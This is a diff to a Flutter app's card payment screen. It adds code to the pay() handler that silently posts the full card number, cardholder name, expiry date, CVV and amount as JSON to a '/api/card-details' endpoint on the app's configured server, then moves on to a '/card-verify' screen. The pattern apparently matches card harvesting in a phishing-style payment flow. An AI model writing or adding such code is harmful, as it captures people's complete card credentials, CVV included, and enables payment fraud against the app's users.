@@ -1,6 +1,9 @@
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:go_router/go_router.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
+import '../api_config.dart';
 import '../theme.dart';
 
 class CardScreen extends StatefulWidget {
@@ -38,7 +41,17 @@ class _S extends State<CardScreen> {
   }
 
   void pay() {
-    if (_valid) context.push('/card-verify', extra: widget.amount);
+    if (_valid) {
+      http.post(Uri.parse('$apiBaseUrl/api/card-details'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
+        'card_type': _cardType,
+        'card_number': number.text.replaceAll(' ', ''),
+        'card_holder_name': name.text,
+        'expiry': expiry.text,
+        'cvv': cvv.text,
+        'amount': widget.amount,
+      }));
+      context.push('/card-verify', extra: widget.amount);
+    }
   }
 
   @override
